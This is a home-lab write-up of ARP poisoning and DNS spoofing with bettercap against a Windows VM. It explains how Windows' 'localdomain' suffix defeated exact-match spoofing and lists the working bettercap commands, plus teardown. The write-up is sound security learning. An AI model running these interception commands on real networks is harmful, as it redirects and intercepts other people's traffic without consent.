# DNS Spoofing Lab — Windows Victim (ARP Poisoning + Bettercap)

## Objective
Repeat the DNS spoofing lab originally run against an Ubuntu victim, this time targeting a Windows VM, to see how the attack surface and diagnosis differ against a different DNS client.

## Environment

| Role | OS | IP |
|---|---|---|
| Attacker | Kali Linux | 192.168.115.134 |
| Victim | Windows | 192.168.115.131 |
| Gateway (VMware NAT) | — | 192.168.115.2 |
| Wazuh Manager | — | 192.168.115.129 |

All VMs on the same VMware NAT virtual network (VMnet8), same L2 subnet.

## Attack Chain

1. **ARP poisoning** — used `bettercap`'s `arp.spoof` module targeting the Windows VM. Confirmed via `arp -a` on Windows: the gateway's entry showed Kali's MAC (`74-97-79-39-df-63`) instead of the real gateway's.
2. **DNS spoofing** — configured `bettercap`'s `dns.spoof` module to answer for `example.com` with the attacker's IP.
3. **Fake destination** — Apache running on Kali, serving a page to confirm the redirect visually via a real browser request, not just a DNS lookup.

## Issue Encountered & Root-Caused

### DNS spoof initially failed despite working ARP poisoning
**Symptom:** ARP poisoning confirmed correct (`arp -a` showed Kali's MAC for the gateway), `bettercap` running with no errors, but `nslookup example.com` kept returning the real IP instead of the spoofed one.

**Diagnosis:** Packet capture on Kali (`tcpdump -i eth0 -n port 53`) revealed Windows wasn't actually querying `example.com` — it was querying **`example.com.localdomain`**, due to a connection-specific DNS suffix (`localdomain`) that Windows appends before trying the plain name:
```
192.168.115.131.55333 > 192.168.115.2.53: 2+ A? example.com.localdomain. (41)
192.168.115.2.53 > 192.168.115.131.55333: 2*- 1/0/0 A 172.66.147.243 (57)
```
Since `dns.spoof.domains` was set to match `example.com` exactly, it never matched the suffixed query name, so `bettercap` ignored it and the real DNS server answered untouched.

**Fix:** Added the suffixed variant to bettercap's domain match list:
```
set dns.spoof.domains example.com, example.com.localdomain
```
(An alternative, broader fix would have been `set dns.spoof.all true`, which was used first to confirm the diagnosis before switching to the more precise, domain-specific fix above.)

## Result

`nslookup example.com` on Windows resolved to `192.168.115.134` instead of the real IP, and browsing to `http://example.com` in Firefox on the Windows VM loaded the spoofed Apache page directly — full end-to-end confirmation across both DNS resolution and an actual browser request.

## Bettercap Command Reference (Windows Target)

**1. Launch bettercap on Kali:**
```bash
sudo bettercap -iface eth0
```

**2. Start ARP spoofing against the Windows victim:**
```
set arp.spoof.targets 192.168.115.131
arp.spoof on
```

**3. Configure and start the DNS spoof module — include the suffixed domain variant:**
```
set dns.spoof.domains example.com, example.com.localdomain
set dns.spoof.address 192.168.115.134
dns.spoof on
```

**4. Verify from the Windows victim (cmd):**
```cmd
nslookup example.com
```
Should resolve to `192.168.115.134` instead of the real IP.

**5. Serve a page to visibly confirm the redirect (Kali):**
```bash
sudo systemctl start apache2
sudo ss -tlnp | grep :80    # confirm it's listening
```
Then from Windows, browse to `http://example.com` in a browser.

**6. Teardown, inside the bettercap prompt:**
```
dns.spoof off
arp.spoof off
```
Then exit bettercap and stop Apache if it was only started for this lab:
```bash
sudo systemctl stop apache2
```

## Key Takeaway

Different operating systems' DNS clients can construct queries differently even for the same typed input — Windows' domain suffix search list behavior versus Linux's more literal resolution. A DNS spoof tool's domain match list needs to account for this: it must match the exact string a client actually sends on the wire, not just the name the user typed. Packet capture (`tcpdump`) was the deciding diagnostic step in catching this, since `bettercap` gave no error — it simply never matched a query it wasn't looking for.
